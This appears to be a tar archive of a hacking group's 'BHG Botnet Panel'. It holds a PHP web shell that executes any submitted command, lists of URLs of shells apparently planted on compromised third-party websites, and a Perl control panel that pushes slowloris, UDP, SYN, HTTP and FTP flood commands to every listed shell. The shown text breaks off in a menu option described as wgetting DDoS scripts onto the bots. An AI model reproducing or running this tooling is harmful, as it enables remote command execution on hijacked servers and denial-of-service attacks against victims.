root/Desktop/Projects/BHG-Botnet-Panel-Private-Version-[linux]/                                     0000755 0000000 0000000 00000000000 12002060465 023302  5                                                                                                    ustar   root                            root                                                                                                                                                                                                                   root/Desktop/Projects/BHG-Botnet-Panel-Private-Version-[linux]/Untitled Document~                   0000777 0000000 0000000 00000000000 11761662076 026770  0                                                                                                    ustar   root                            root                                                                                                                                                                                                                   root/Desktop/Projects/BHG-Botnet-Panel-Private-Version-[linux]/BOTS.txt~                            0000777 0000000 0000000 00000000643 11761662102 025031  0                                                                                                    ustar   root                            root                                                                                                                                                                                                                   http://ecoheritage.co.uk/images/html_color.php
http://keepitsecurity.com/extras/html_color.php
http://www.rich-by-design.com/html_color.php
http://tauchforum.catfish-divers.com/tp-images/File/BHG.php
http://www.askanimequestions.com//wp-content/themes/AskIt/temp/BHG.php
http://102kara.com/wordpress/wp-content/themes/SimplePress/temp/BHG.php
http://agabekov.az/images/smilies/BHG.php
http://daily-update.info/BHG.php

                                                                                             root/Desktop/Projects/BHG-Botnet-Panel-Private-Version-[linux]/Untitled Document                    0000777 0000000 0000000 00000000111 11761662077 026576  0                                                                                                    ustar   root                            root                                                                                                                                                                                                                   http://184.154.131.170/~demon/prestashop/fedex/tools/pclzip/Pclzip-v.php
                                                                                                                                                                                                                                                                                                                                                                                                                                                       root/Desktop/Projects/BHG-Botnet-Panel-Private-Version-[linux]/BOTS.txt                             0000777 0000000 0000000 00000000307 12002044625 024621  0                                                                                                    ustar   root                            root                                                                                                                                                                                                                   http://ecoheritage.co.uk/images/html_color.php
http://keepitsecurity.com/extras/html_color.php
http://www.askanimequestions.com//wp-content/themes/AskIt/temp/BHG.php
http://daily-update.info/BHG.php
                                                                                                                                                                                                                                                                                                                         root/Desktop/Projects/BHG-Botnet-Panel-Private-Version-[linux]/BHG.php                              0000777 0000000 0000000 00000001113 11735443242 024430  0                                                                                                    ustar   root                            root                                                                                                                                                                                                                   <html><head><title>#BHG BOTNET PANEL</title></head><body bgcolor="BLACK">

<font color="red"><center>Code BY G3n3Rall</center>
<font color="red">   <center> #BHG PHP FILE FOR BOTNET PANEL </center>
   <form name="cmd" method="post" enctype="multipart/form-data">
<p align="center">
<font color="#fffff0"><input name="cmd" id="commandLine" value="" size="59" type="text"> <input name="Execute" id="Execute" value="Execute" type="submit">   
<font color="#fffff0">	<br>
</font><p></p>
<pre><?php if ($_POST['cmd']){
$cmd = $_POST['cmd'];
passthru($cmd);
}
?>
</pre>

</form></body></html>
                                                                                                                                                                                                                                                                                                                                                                                                                                                     root/Desktop/Projects/BHG-Botnet-Panel-Private-Version-[linux]/BHG-Botnet-Panel.pl                  0000777 0000000 0000000 00000064766 11776374640 026603  0                                                                                                    ustar   root                            root                                                                                                                                                                                                                   #!/usr/bin/perl
#BHG Botnet Panel Version BETA [ Private Version ]
#BLACK HAT GROUP SECURITY CENTER
#Code By G3n3Rall
#AnTi.SecurityBoy@Gmail.com
#We Are : Net.Edit0r , A.Crox , 3H34N , Am!n , tHe.K!ll3r , ArYaIeIrAn , G3n3Rall , Mr.XHat , NoL1m1t , Black Viper ....
#www.Black-HG.Org   | Our Forum : www.Black-HG.Org/cc/
#IRANIAN HACKERS
################
use WWW::Mechanize;
use LWP::Simple;
use HTTP::Request;
use LWP::UserAgent;
################
system(($^O eq 'MSWin32') ? 'cls' : 'clear');   #or u can use  system("cls");  in windows and in linux system("clear");
print q {
''''''''''''''''''''''''A'''''''''A''''''''''''''''''''''''''
'''''''''''''''''''''''''A'''''''''A'''''''''''''''''''''''''
'''''''''''''''''''''A'''A'''''''''A'''A'''''''''''''''''''''
'''''''''''''''''''''A''AA'''''''''AA''A'''''''''''''''''''''
'''''''''''''''''''''AA'AAA'''''''AAA'AA'''''''''''''''''''''
'''''''''''''A''''''AA'''AAA'''''AAA'''AA''''''A'''''''''''''
''''''''''''AA''''''AA'''AAA'''''AAA'''AA''''''AA''''''''''''
'''''''''''AA''''''AA''''AAAA'''AAAA''''AA''''''AA'''''''''''
'''''''''''AA'''''AAA''''AAAA''AAAAA''''AAA'''''AAA''''''''''
'''''''A''AAA''''AAAA''''AAAA'''AAAA''''AAAA'''AAAA''A'''''''
'''''''AA'AAAAA''AAAA'''AAAAA'''AAAAA'''AAAA''AAAAA'AA'''''''
'''''''AA'AAAAA''AAAAAAAAAAA'''''AAAAAAAAAAA''AAAAA'A''''''''
'''''''AA'AAAAA''AAAAAAAAAAA'''''AAAAAAAAAAA''AAAAA'AA'''''''
''''''AAA''AAAA'''AAAAAAAAAAAAAAAAAAAAAAAAA'''AAAA''AAA''''''
'''''AAAA''AAAA'''AAAAAAAAAAAAAAAAAAAAAAAAA'''AAAA''AAAA'''''
''''AAAA'''AAAAA'AAAAAAAAAAAAAAAAAAAAAAAAAAA'AAAAA'''AAAA''''
'''AAAA''''AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'''AAAA''''
'''AAAAA''AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA''AAAA''''
''''AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA''''
''''AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA''''
'''''AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'''''
'''''AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'''''
''''''AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA''''''
'''''AAAAA'''''''''''AAAAAAAAAAAAAAAAAAA'''''''''''AAAAA'''''
'''''AAAAAA'''''''''''''AAAAAAAAAAAAA'''''''''''''AAAAAA'''''
''''''AAAAAAA''''''''..'''''AAAAAAAAA'''''..'''''AAAAAA''''''
'''''''AAAAAAAA'''''''''''''AAAAA'''''''''''''AAAAAAAA'''''''
''''''''AAAAAAAAAA'''''''''''AAA'''''''''''AAAAAAAAAA''''''''
'''''''''''AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'''''''''''
''''''''''''''AAAAAAAAAAAAAAA'''AAAAAAAAAAAAAAA''''''''''''''
''''''''''''''''''AAAAAAAAAA'''''AAAAAAAAAA''''''''''''''''''
'''''''''''''''''''AAAAAAAA'''''''AAAAAAAA'''''''''''''''''''
''''''''''''''''''AAAAAAAAA'''''''AAAAAAAAA''''''''''''''''''
''''''''''''''''''AAAAAAAAA'AAAAA'AAAAAAAAA''''''''''''''''''
'''''''''''''''''AAAAAAAAAAAAAAAAAAAAAAAAAAA'''''''''''''''''
'''''''''''''''''AAA''AAAAAAAAAAAAAAAAA''AAA'''''''''''''''''
''''''''''''''''''AA''AAAA''AAAAA''AAAA''AA''''''''''''''''''
''''''''''''''''''''''AAAA''AAAAA''AAAA''''''''''''''''''''''
};

sleep(2);

###############
print"\n \t \t #BHG Botnet Panel Version BETA [Private Version]  |  G3n3Rall";
print"\n \t\t  BLACK-HG.ORG    |Forum:  BLACK-HG.ORG/cc/ ";
MENU:;
print "\n\n\n \t\t\t Choose Your DDoser :\n";
print "\n\n \t\t 1- Slowloris [Good For Apache webservers]";
print "\n \t\t 2- UDP ULTIMATE DDOSER";
print "\n \t\t 3- Multi DDOSER [WORDPRESS - JOOMLA - DRUPAL]";
print "\n \t\t 4- VBulletin DDOSER [ULTIMATE]";
print "\n \t\t 5- Syn Flooder";
print "\n \t\t 6- IHS DDOSER ";
print "\n \t\t 7- Loop Floder ";
print "\n \t\t 8- FTP DDOSER [ULTIMATE]";
print "\n \t\t 9- HTTPD FLOODER ";
print "\n \t\t 10- Wget DDOSERs ON YOUR SERVERS ! & Set 777 Permission ";
print "\n\n \t\t 11- Exit ";
print "\n\n \t Choose ?:";
###################
###################
###################
###################
$Menu =<STDIN>;
if ($Menu==11) {
print"\n\t\t Exit \n";
exit;}
chomp ($Menu);
###################
###################
###################
###################
#Slowloris.pl
if ($Menu == 1){
print "\n\t\t You Choose Slowloris \n";
print "\n\n\t\t PROGRESSING ....";
print"\n";
print"\n";
sleep(3);
ForCheck:;
print "\n\n \t\t Do want check your BOTS ?";
print "\n\n\n \t\t 1- YES";
print "\n \t\t 2- NO";
print "\n \t\t Check ?:";
$check=<STDIN>;
chomp ($check);

if ($check == 2){
print " \n \t \t ok ";
goto Target;
}
if ($check == 1) {
print " \n \t\t Checking .... \n";
open (BTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BTS>){
		
		$BOTS=$_;
		chomp $BOTS;
		syswrite STDOUT, "\t";
		$request = HTTP::Request->new(GET=>$BOTS);
		$useragent = LWP::UserAgent->new();
		$response = $useragent->request($request);
		if ($response->is_success && $response->content =~ /G3n3Rall/ || /#BHG/){
		syswrite STDOUT,"\n\n \t\t  $BOTS => Success \n";
		
		}
		else
		{
		syswrite STDOUT, "$BOTS => KILLED\n";
		sleep(2);
		exit;
		}
		}

		goto Target;
}
if ($check =! 1 || 2) {
system(($^O eq 'MSWin32') ? 'cls' : 'clear'); 
print "\n \t\t\t invalid id\n";
goto ForCheck;
}
Target:;
print "\n \t LOADING ...\n ";
print "\n";
sleep (3);
print "\t Enter Target:";
$Target=<STDIN>;
chomp ($Target);
print "\n\t Enter Port:";
$Port =<STDIN>;
chomp ($Port);
print "\n\t Timeout:";
$Timeout = <STDIN>;
$cmd = "perl slowloris.pl -dns $Target -port $Port -timeout $Timeout";
$fieldname = "cmd";
goto ddos;
#############
ddos:;
open (BOTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BOTS>) {
$ATTACK=$_;
chomp $ATTACK;

syswrite STDOUT, "\n\t Connecting ...\n";
my $mechanizee = WWW::Mechanize->new(timeout => 50);
$mechanizee->get($ATTACK);
$mechanizee->field("$fieldname" => "$cmd");
$mechanizee->click();
print "\n\t################\n";

syswrite STDOUT, "\t\t\t ok Started ...... \n";
print "\n\t\t ALL BOTS ATTACKING TO $Target";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n\n\n\t\t BLACK HAT GROUP | G3n3Rall \n";
print"\n";
}
print"\n";
system("xterm -e \"ping $Target -c $Timeout\"");
exit;

}
###################
###################
###################
###################
#ultimate-ddoser.pl
if ($Menu == 2){
print "\n\t\t You Choose UDP ULTIMATE DDOSER \n";
print "\n\n\t\t PROGRESSING ....";
print"\n";
print"\n";
sleep(3);
ForCheck2:;
print "\n\n \t\t Do want check your BOTS ?";
print "\n\n\n \t\t 1- YES";
print "\n \t\t 2- NO";
print "\n \t\t Check ?:";
$check=<STDIN>;
chomp ($check);
if ($check == 2){
print " \n \t \t ok ";
goto Target2;
}
if ($check == 1) {
print " \n \t\t Checking .... \n";
open (BTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BTS>){
		$BOTS=$_;
		chomp $BOTS;
		syswrite STDOUT, "\t";
		$request = HTTP::Request->new(GET=>$BOTS);
		$useragent = LWP::UserAgent->new();
		$response = $useragent->request($request);
		if ($response->is_success && $response->content =~ /G3n3Rall/ || /#BHG/){
		syswrite STDOUT,"\n\n \t\t  $BOTS => Success \n";
		goto Target2;
		}
		else
		{
		syswrite STDOUT, "$BOTS => KILLED\n";
		sleep(2);
		exit;
		}
		}
}
if ($check =! 1 || 2) {
system(($^O eq 'MSWin32') ? 'cls' : 'clear'); 
print "\n \t\t\t invalid id\n";
goto ForCheck2;
}
Target2:;
print "\n \t LOADING ...\n ";
print "\n";
sleep (3);
print "\t Enter Target[ip]:";
$Target=<STDIN>;
chomp ($Target);
print "\n\t Enter Port:";
$Port =<STDIN>;
chomp ($Port);
$cmd = "perl udp-flooder-ultimate.pl $Target $Port";
$fieldname = "cmd";
goto ddos2;
#############
ddos2:;
open (BOTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BOTS>) {
$ATTACK=$_;
chomp $ATTACK;

syswrite STDOUT, "\n\t Connecting ...\n";
my $mechanizee = WWW::Mechanize->new(timeout => 50);
$mechanizee->get($ATTACK);
$mechanizee->field("$fieldname" => "$cmd");
$mechanizee->click();
print "\n\t################\n";
syswrite STDOUT, "\t\t\t ok Started ...... \n";
print "\n\t\t ALL BOTS ATTACKING TO $Target";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n\n\n\t\t BLACK HAT GROUP | G3n3Rall \n";
print"\n";
}
print"\n";
system("xterm -e \"ping $Target\"");
exit;
}
###################
###################
###################
###################
#multi-ddoser.pl
if ($Menu == 3){
print "\n\t\t You Choose MULTI DDOSER \n";
print "\n\n\t\t PROGRESSING ....";
print"\n";
print"\n";
sleep(3);
ForCheck3:;
print "\n\n \t\t Do want check your BOTS ?";
print "\n\n\n \t\t 1- YES";
print "\n \t\t 2- NO";
print "\n \t\t Check ?:";
$check=<STDIN>;
chomp ($check);
if ($check == 2){
print " \n \t \t ok ";
goto Target3;
}
if ($check == 1) {
print " \n \t\t Checking .... \n";
open (BTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BTS>){
		$BOTS=$_;
		chomp $BOTS;
		syswrite STDOUT, "\t";
		$request = HTTP::Request->new(GET=>$BOTS);
		$useragent = LWP::UserAgent->new();
		$response = $useragent->request($request);
		if ($response->is_success && $response->content =~ /G3n3Rall/ || /#BHG/){
		syswrite STDOUT,"\n\n \t\t  $BOTS => Success \n";
		goto Target3;
		}
		else
		{
		syswrite STDOUT, "$BOTS => KILLED\n";
		sleep(2);
		exit;
		}
		}
}
if ($check =! 1 || 2) {
system(($^O eq 'MSWin32') ? 'cls' : 'clear'); 
print "\n \t\t\t invalid id\n";
goto ForCheck3;
}
Target3:;
print "\n \t LOADING ...\n ";
print "\n";
sleep (3);
print "\t Enter Target:";
$Target=<STDIN>;
chomp ($Target);
print "\n\tTimeout:";
$Timeout =<STDIN>;
print "\n\n \t Select Options: W = WordPress |  J = Joomla  |  D = Drupal";
print "Options:";
$Options=<STDIN>;
$cmd = "perl multi-ddoser.pl $Target $Timeout $Options";
$fieldname = "cmd";
goto ddos3;
#############
ddos3:;
open (BOTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BOTS>) {
$ATTACK=$_;
chomp $ATTACK;

syswrite STDOUT, "\n\t Connecting ...\n";
my $mechanizee = WWW::Mechanize->new(timeout => 50);
$mechanizee->get($ATTACK);
$mechanizee->field("$fieldname" => "$cmd");
$mechanizee->click();
print "\n\t################\n";
syswrite STDOUT, "\t\t\t ok Started ...... \n";
print "\n\t\t ALL BOTS ATTACKING TO $Target";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n\n\n\t\t BLACK HAT GROUP | G3n3Rall \n";
print"\n";
}
print"\n";
system("xterm -e \"ping $Target -c $Timeout\"");
exit;
}
###################
###################
###################
###################
#vbulletin-ddoser.pl
if ($Menu == 4){
print "\n\t\t You Choose VBulletin DDOSER [ULTIMATE] \n";
print "\n\n\t\t PROGRESSING ....";
print"\n";
print"\n";
sleep(3);
ForCheck4:;
print "\n\n \t\t Do want check your BOTS ?";
print "\n\n\n \t\t 1- YES";
print "\n \t\t 2- NO";
print "\n \t\t Check ?:";
$check=<STDIN>;
chomp ($check);
if ($check == 2){
print " \n \t \t ok ";
goto Target4;
}
if ($check == 1) {
print " \n \t\t Checking .... \n";
open (BTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BTS>){
		$BOTS=$_;
		chomp $BOTS;
		syswrite STDOUT, "\t";
		$request = HTTP::Request->new(GET=>$BOTS);
		$useragent = LWP::UserAgent->new();
		$response = $useragent->request($request);
		if ($response->is_success && $response->content =~ /G3n3Rall/ || /#BHG/){
		syswrite STDOUT,"\n\n \t\t  $BOTS => Success \n";
		goto Target4;
		}
		else
		{
		syswrite STDOUT, "$BOTS => KILLED\n";
		sleep(2);
		exit;
		}
		}
}
if ($check =! 1 || 2) {
system(($^O eq 'MSWin32') ? 'cls' : 'clear'); 
print "\n \t\t\t invalid id\n";
goto ForCheck4;
}
Target4:;
print "\n \t LOADING ...\n ";
print "\n";
sleep (3);
print "\t Enter Target:";
$Target=<STDIN>;
chomp ($Target);
print "Forum Path [ example /forum/   or  /:";
$Path=<STDIN>;
$cmd = "perl vbulletin-ddoser.pl $Target $Path";
$fieldname = "cmd";
goto ddos4;
#############
ddos4:;
open (BOTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BOTS>) {
$ATTACK=$_;
chomp $ATTACK;

syswrite STDOUT, "\n\t Connecting ...\n";
my $mechanizee = WWW::Mechanize->new(timeout => 50);
$mechanizee->get($ATTACK);
$mechanizee->field("$fieldname" => "$cmd");
$mechanizee->click();
print "\n\t################\n";
syswrite STDOUT, "\t\t\t ok Started ...... \n";
print "\n\t\t ALL BOTS ATTACKING TO $Target";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n\n\n\t\t BLACK HAT GROUP | G3n3Rall \n";
print"\n";
}
print"\n";
system("xterm -e \"ping $Target\"");
exit;
}
###################
###################
###################
###################
#syn-flooder.pl
if ($Menu == 5){
print "\n\t\t You Choose Syn Flooder \n";
print "\n\n\t\t PROGRESSING ....";
print"\n";
print"\n";
sleep(3);
ForCheck5:;
print "\n\n \t\t Do want check your BOTS ?";
print "\n\n\n \t\t 1- YES";
print "\n \t\t 2- NO";
print "\n \t\t Check ?:";
$check=<STDIN>;
chomp ($check);
if ($check == 2){
print " \n \t \t ok ";
goto Target5;
}
if ($check == 1) {
print " \n \t\t Checking .... \n";
open (BTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BTS>){
		$BOTS=$_;
		chomp $BOTS;
		syswrite STDOUT, "\t";
		$request = HTTP::Request->new(GET=>$BOTS);
		$useragent = LWP::UserAgent->new();
		$response = $useragent->request($request);
		if ($response->is_success && $response->content =~ /G3n3Rall/ || /#BHG/){
		syswrite STDOUT,"\n\n \t\t  $BOTS => Success \n";
		goto Target5;
		}
		else
		{
		syswrite STDOUT, "$BOTS => KILLED\n";
		sleep(2);
		exit;
		}
		}
}
if ($check =! 1 || 2) {
system(($^O eq 'MSWin32') ? 'cls' : 'clear'); 
print "\n \t\t\t invalid id\n";
goto ForCheck6;
}
Target5:;
print "\n \t LOADING ...\n ";
print "\n";
sleep (3);
print "\t Enter Target[ip]:";
$Target=<STDIN>;
chomp ($Target);
print "\n\t Enter Port:";
$Port =<STDIN>;
chomp ($Port);
print "\n\t Timeout:";
$Timeout = <STDIN>;
$cmd = "perl syn-flooder.pl $Target $Port $Timeout";
$fieldname = "cmd";
goto ddos5;
#############
ddos5:;
open (BOTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BOTS>) {
$ATTACK=$_;
chomp $ATTACK;

syswrite STDOUT, "\n\t Connecting ...\n";
my $mechanizee = WWW::Mechanize->new(timeout => 50);
$mechanizee->get($ATTACK);
$mechanizee->field("$fieldname" => "$cmd");
$mechanizee->click();
print "\n\t################\n";
syswrite STDOUT, "\t\t\t ok Started ...... \n";
print "\n\t\t ALL BOTS ATTACKING TO $Target";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n\n\n\t\t BLACK HAT GROUP | G3n3Rall \n";
print"\n";
}
print"\n";
system("xterm -e \"ping $Target -c $Timeout\"");
exit;
}
###################
###################
###################
###################
#ihs-ddoser.pl
if ($Menu == 6){
print "\n\t\t You Choose IHS DDOSER \n";
print "\n\n\t\t PROGRESSING ....";
print"\n";
print"\n";
sleep(3);
ForCheck6:;
print "\n\n \t\t Do want check your BOTS ?";
print "\n\n\n \t\t 1- YES";
print "\n \t\t 2- NO";
print "\n \t\t Check ?:";
$check=<STDIN>;
chomp ($check);
if ($check == 2){
print " \n \t \t ok ";
goto Target6;
}
if ($check == 1) {
print " \n \t\t Checking .... \n";
open (BTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BTS>){
		$BOTS=$_;
		chomp $BOTS;
		syswrite STDOUT, "\t";
		$request = HTTP::Request->new(GET=>$BOTS);
		$useragent = LWP::UserAgent->new();
		$response = $useragent->request($request);
		if ($response->is_success && $response->content =~ /G3n3Rall/ || /#BHG/){
		syswrite STDOUT,"\n\n \t\t  $BOTS => Success \n";
		goto Target6;
		}
		else
		{
		syswrite STDOUT, "$BOTS => KILLED\n";
		sleep(2);
		exit;
		}
		}
}
if ($check =! 1 || 2) {
system(($^O eq 'MSWin32') ? 'cls' : 'clear'); 
print "\n \t\t\t invalid id\n";
goto ForCheck6;
}
Target6:;
print "\n \t LOADING ...\n ";
print "\n";
sleep (3);
print "\t Enter Target [IP]:";
$Target=<STDIN>;
chomp ($Target);
print "\n\t Enter Port:";
$Port =<STDIN>;
chomp ($Port);
print "\n\t Timeout:";
$Timeout = <STDIN>;
$cmd = "perl ihs-ddoser.pl $Target $Port $Timeout";
$fieldname = "cmd";
goto ddos6;
#############
ddos6:;
open (BOTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BOTS>) {
$ATTACK=$_;
chomp $ATTACK;

syswrite STDOUT, "\n\t Connecting ...\n";
my $mechanizee = WWW::Mechanize->new(timeout => 50);
$mechanizee->get($ATTACK);
$mechanizee->field("$fieldname" => "$cmd");
$mechanizee->click();
print "\n\t################\n";
syswrite STDOUT, "\t\t\t ok Started ...... \n";
print "\n\t\t ALL BOTS ATTACKING TO $Target";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n\n\n\t\t BLACK HAT GROUP | G3n3Rall \n";
print"\n";
}
print"\n";
system("xterm -e \"ping $Target -c $Timeout\"");
exit;
}
###################
###################
###################
###################
#loop-flooder.pl
if ($Menu == 7){
print "\n\t\t You Choose LOOP FLOODER \n";
print "\n\n\t\t PROGRESSING ....";
print"\n";
print"\n";
sleep(3);
ForCheck7:;
print "\n\n \t\t Do want check your BOTS ?";
print "\n\n\n \t\t 1- YES";
print "\n \t\t 2- NO";
print "\n \t\t Check ?:";
$check=<STDIN>;
chomp ($check);
if ($check == 2){
print " \n \t \t ok ";
goto Target7;
}
if ($check == 1) {
print " \n \t\t Checking .... \n";
open (BTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BTS>){
		$BOTS=$_;
		chomp $BOTS;
		syswrite STDOUT, "\t";
		$request = HTTP::Request->new(GET=>$BOTS);
		$useragent = LWP::UserAgent->new();
		$response = $useragent->request($request);
		if ($response->is_success && $response->content =~ /G3n3Rall/ || /#BHG/){
		syswrite STDOUT,"\n\n \t\t  $BOTS => Success \n";
		goto Target7;
		}
		else
		{
		syswrite STDOUT, "$BOTS => KILLED\n";
		sleep(2);
		exit;
		}
		}
}
if ($check =! 1 || 2) {
system(($^O eq 'MSWin32') ? 'cls' : 'clear'); 
print "\n \t\t\t invalid id\n";
goto ForCheck7;
}
Target7:;
print "\n \t LOADING ...\n ";
print "\n";
sleep (3);
print "\t Enter Target [IP]:";
$Target=<STDIN>;
chomp ($Target);
print "\n\t Timeout:";
$Timeout = <STDIN>;
$out = $Timeout * 2000000; # THIS DDOSER HAVE DIFFERNT TIMEOUT  1 sec = 2000000
$cmd = "perl loop-flooder.pl $Target $out";
$fieldname = "cmd";
goto ddos7;
#############
ddos7:;
open (BOTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BOTS>) {
$ATTACK=$_;
chomp $ATTACK;

syswrite STDOUT, "\n\t Connecting ...\n";
my $mechanizee = WWW::Mechanize->new(timeout => 50);
$mechanizee->get($ATTACK);
$mechanizee->field("$fieldname" => "$cmd");
$mechanizee->click();
print "\n\t################\n";
syswrite STDOUT, "\t\t\t ok Started ...... \n";
print "\n\t\t ALL BOTS ATTACKING TO $Target";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n\n\n\t\t BLACK HAT GROUP | G3n3Rall \n";
print"\n";
}
print"\n";
system("xterm -e \"ping $Target -c $Timeout\"");
exit;
}
###################
###################
###################
###################
#ftp-ddoser.pl
if ($Menu == 8){
print "\n\t\t You Choose FTP DDOSER \n";
print "\n\n\t\t PROGRESSING ....";
print"\n";
print"\n";
sleep(3);
ForCheck8:;
print "\n\n \t\t Do want check your BOTS ?";
print "\n\n\n \t\t 1- YES";
print "\n \t\t 2- NO";
print "\n \t\t Check ?:";
$check=<STDIN>;
chomp ($check);
if ($check == 2){
print " \n \t \t ok ";
goto Target8;
}
if ($check == 1) {
print " \n \t\t Checking .... \n";
open (BTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BTS>){
		$BOTS=$_;
		chomp $BOTS;
		syswrite STDOUT, "\t";
		$request = HTTP::Request->new(GET=>$BOTS);
		$useragent = LWP::UserAgent->new();
		$response = $useragent->request($request);
		if ($response->is_success && $response->content =~ /G3n3Rall/ || /#BHG/){
		syswrite STDOUT,"\n\n \t\t  $BOTS => Success \n";
		goto Target8;
		}
		else
		{
		syswrite STDOUT, "$BOTS => KILLED\n";
		sleep(2);
		exit;
		}
		}
}
if ($check =! 1 || 2) {
system(($^O eq 'MSWin32') ? 'cls' : 'clear'); 
print "\n \t\t\t invalid id\n";
goto ForCheck8;
}
Target8:;
print "\n \t LOADING ...\n ";
print "\n";
sleep (3);
print "\t Enter Target [IP]:";
$Target=<STDIN>;
chomp ($Target);
$cmd = "perl ftp-ddoser.pl $Target";
$fieldname = "cmd";
goto ddos8;
#############
ddos8:;
open (BOTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BOTS>) {
$ATTACK=$_;
chomp $ATTACK;

syswrite STDOUT, "\n\t Connecting ...\n";
my $mechanizee = WWW::Mechanize->new(timeout => 50);
$mechanizee->get($ATTACK);
$mechanizee->field("$fieldname" => "$cmd");
$mechanizee->click();
print "\n\t################\n";
syswrite STDOUT, "\t\t\t ok Started ...... \n";
print "\n\t\t ALL BOTS ATTACKING TO $Target";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n\n\n\t\t BLACK HAT GROUP | G3n3Rall \n";
print"\n";
}
print"\n";
system("xterm -e \"ping $Target\"");
exit;
}
###################
###################
###################
###################
#httpd-flooder.pl
if ($Menu == 9){
print "\n\t\t You Choose HTTPD FLOODER \n";
print "\n\n\t\t PROGRESSING ....";
print"\n";
print"\n";
sleep(3);
ForCheck9:;
print "\n\n \t\t Do want check your BOTS ?";
print "\n\n\n \t\t 1- YES";
print "\n \t\t 2- NO";
print "\n \t\t Check ?:";
$check=<STDIN>;
chomp ($check);
if ($check == 2){
print " \n \t \t ok ";
goto Target9;
}
if ($check == 1) {
print " \n \t\t Checking .... \n";
open (BTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BTS>){
		$BOTS=$_;
		chomp $BOTS;
		syswrite STDOUT, "\t";
		$request = HTTP::Request->new(GET=>$BOTS);
		$useragent = LWP::UserAgent->new();
		$response = $useragent->request($request);
		if ($response->is_success && $response->content =~ /G3n3Rall/ || /#BHG/){
		syswrite STDOUT,"\n\n \t\t  $BOTS => Success \n";
		goto Target9;
		}
		else
		{
		syswrite STDOUT, "$BOTS => KILLED\n";
		sleep(2);
		exit;
		}
		}
}
if ($check =! 1 || 2) {
system(($^O eq 'MSWin32') ? 'cls' : 'clear'); 
print "\n \t\t\t invalid id\n";
goto ForCheck9;
}
Target9:;
print "\n \t LOADING ...\n ";
print "\n";
sleep (3);
print "\t Enter Target:";
$Target=<STDIN>;
chomp ($Target);
print "\t Enter Port:";
$Port=<STDIN>;
chomp ($Port);
print "\t Enter Timeout:";
$Timeout=<STDIN>;
chomp ($Timeout);
print "\t Enter Connection Number:";
$Connection=<STDIN>;
chomp ($Connection);
$for == 1;
$cmd = "perl httpd-flooder.pl $Target $Port $Timeout $Connection $for";
$fieldname = "cmd";
goto ddos9;
#############
ddos9:;
open (BOTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BOTS>) {
$ATTACK=$_;
chomp $ATTACK;

syswrite STDOUT, "\n\t Connecting ...\n";
my $mechanizee = WWW::Mechanize->new(timeout => 50);
$mechanizee->get($ATTACK);
$mechanizee->field("$fieldname" => "$cmd");
$mechanizee->click();
print "\n\t################\n";
syswrite STDOUT, "\t\t\t ok Started ...... \n";
print "\n\t\t ALL BOTS ATTACKING TO $Target";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n \t\t .............................\n";
print "\n\n\n\t\t BLACK HAT GROUP | G3n3Rall \n";
print"\n";
}
print"\n";
system("xterm -e \"ping $Target -c $Timeout\"");
exit;
}

###################
###################
###################
#wget and chmod 777 
if ($Menu = 10){
print "\n\n\t PROGRESSING FOR SEND DDOSER TO ALL  BOTS AND SET 777 PERMISSION ....";
print"\n";
print"\n";
sleep(3);
ForCheck10:;
print "\n\n \t\t Do want check your BOTS ?";
print "\n\n\n \t\t 1- YES";
print "\n \t\t 2- NO";
print "\n \t\t Check ?:";
$check=<STDIN>;
chomp ($check);

if ($check == 2){
print " \n \t \t ok ";
goto TRANSPORT;
}
if ($check == 1) {
print " \n \t\t Checking .... \n";
open (BTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BTS>){
		
		$BOTS=$_;
		chomp $BOTS;
		syswrite STDOUT, "\t";
		$request = HTTP::Request->new(GET=>$BOTS);
		$useragent = LWP::UserAgent->new();
